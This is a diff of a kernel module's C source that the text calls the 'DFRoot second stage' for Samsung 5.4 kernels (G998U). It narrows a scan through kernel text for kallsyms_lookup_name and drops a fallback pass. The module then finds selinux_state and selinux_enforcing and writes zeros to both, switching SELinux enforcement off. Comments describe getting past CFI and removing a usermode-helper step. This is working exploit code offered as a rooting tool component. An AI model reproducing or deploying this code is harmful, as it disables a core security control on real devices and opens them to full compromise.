@@ -2,20 +2,18 @@
  *
  * No anchor, no slide input, no kprobe/UMH/filp imports, no text decode:
  * Device-agnostic v2: no per-device scan center is required at runtime —
- * sprint_symbol's own runtime address anchors the kallsyms_lookup_name
- * scan (same-file neighbor); KLN_FILE stays only as a fallback for
- * exotic builds. NOTE: the ko MUST still be built against the target
- * kernel tree (vermagic/modversions/ABI) — that part is per-build.
- *  1. Scan for "kallsyms_lookup_name+0x0/" via sprint_symbol: pass 1
- *     centers on &sprint_symbol +/-2MB (same-file delta is KBs on all
- *     5.4 Samsung builds), pass 2 falls back to the HZC2 anchor.
+ * Resolve kallsyms_lookup_name by scanning the Samsung 5.4 text range
+ * through sprint_symbol. The fixed link base and 64 MiB scan avoid
+ * per-device address fallbacks. The module must still be built against
+ * the exact target kernel for vermagic, MODVERSIONS and ABI.
+ *  1. Scan for "kallsyms_lookup_name+0x0/" with sprint_symbol.
  *  2. kln("selinux_state") -> write 0 (data access, CFI-free).
- *  3. kln("selinux_enforcing") -> write 0 (the global int HZC2 reads).
+ *  3. kln("selinux_enforcing") -> write 0 (the global enforcement integer).
  *  4. UMH REMOVED: bare calls pass CFI (proven: resolve+rc=0)
  *     but STATIC_USERMODEHELPER="" turns every helper into a
  *     successful no-op (kernel source confirms). Dead weight cut
  *     (also shrinks splice blocks = fewer stray-write dice rolls).
- *  5. Always return 0 (HZC2 unload-after-error hangs).
+ *  5. Always return 0 (module removal after init errors can hang).
  *
  * Imports: printk + sprint_symbol (both device-proven) + memset/param_ops
  * (core-ubiquitous). Fresh eyes each boot: no state carried.
@@ -29,7 +27,7 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("kurtulus");
-MODULE_DESCRIPTION("self-contained second stage (5.4 family)");
+MODULE_DESCRIPTION("DFRoot second stage for Samsung 5.4");
 
 extern int sprint_symbol(char *buffer, unsigned long address);
 
@@ -55,15 +53,8 @@ typedef int (*fclose_t)(struct file *filp, void *id);
  * (proven: wb-close worked). So: verbose inline duplicates, pointers
  * never leave dfs_init's frame. Ugly is load-bearing. */
 
-/* Pass-1 sweep base: fixed Samsung 5.4 qgki link base (KASLR slide is
- * applied on top; sweep covers 64MB upward, so per-build text drift and
- * KASLR both fit inside the window). */
+/* Fixed Samsung 5.4 link base for the validated G998U kernel. */
 #define KLN_TEXT_BASE	0xffffffc010000000UL
-/* Pass-2 fallback anchor only (v1 per-device scan center, HZC2
- * vmlinux.elf); used only when the fixed-base sweep misses. */
-#define KLN_FILE	0xffffffc0102f860cUL
-#define SCAN_DOWN	(1UL << 20)
-#define SCAN_UP		(16UL << 20)
 #define SCAN_STRIDE	4UL
 
 static char scanbuf[256];
@@ -80,15 +71,9 @@ static int name_is(const char *buf, const char *want)
 	       buf[i + 3] == '0' && buf[i + 4] == '/';
 }
 
-/* Device-agnostic scan.
- * Pass 1: full-text sweep from the fixed Samsung-5.4 link base
- * (0xffffffc010000000, 64MB). KASLR slides observed are MBs, and
- * kallsyms_lookup_name sits ~0.38MB from base on 5.4 family builds,
- * so the hit lands within ~1M sprint_symbol calls (<1s). No per-device
- * anchor needed. CFI caveat prevents anchoring on &sprint_symbol:
- * the module resolves it to a jump-table stub in .rodata.cfi_jt which
- * can sit ~70MB away from kernel text (verified: 76.8MB delta).
- * Pass 2: legacy HZC2 anchor fallback for exotic builds. */
+/* Scan the fixed 64 MiB Samsung 5.4 text range. The target kernel's
+ * KASLR displacement and kallsyms_lookup_name fit within this range.
+ * A miss fails closed rather than probing an address from another device. */
 static unsigned long kln_scan(unsigned long base, unsigned long len)
 {
 	unsigned long a, j;
@@ -109,10 +94,8 @@ static int __init dfs_init(void)
 	kln_t kln;
 
 	found = kln_scan(KLN_TEXT_BASE, 64UL << 20);
-	if (!found)
-		found = kln_scan(KLN_FILE - SCAN_DOWN, SCAN_DOWN + SCAN_UP);
 	if (!found) {
-		pr_info("dfs: kln scan missed both passes\n");
+		pr_info("dfs: kallsyms lookup scan missed the target range\n");
 		goto done;
 	}
 	pr_info("dfs: kln @ %lx (text-base %lx, delta %ld)\n", found,
@@ -121,14 +104,14 @@ static int __init dfs_init(void)
 	sstate = kln("selinux_state");
 	if (!sstate)
 		goto done;
-	/* Layout-agnostic: BOTH leading bools to 0. HZC2/DEVELOP=y layout is
+	/* Layout-agnostic: BOTH leading bools to 0. G998U HZB1 layout is
 	 * disabled[0], enforcing[1]; other 5.4 builds may order these two
 	 * differently (or drop `enforcing` for the global int below).
 	 * selinux_state's first two bytes are always booleans, so writing
 	 * 0 to both is safe on any layout. */
 	*(volatile unsigned char *)(sstate + 0) = 0;
 	*(volatile unsigned char *)(sstate + 1) = 0;
-	/* HZC2 enforcement + enforce-file BOTH read the GLOBAL int
+	/* Samsung enforcement paths BOTH read the GLOBAL int
 	 * selinux_enforcing (not the struct field): clear it too. */
 	{
 		unsigned long genf = kln("selinux_enforcing");
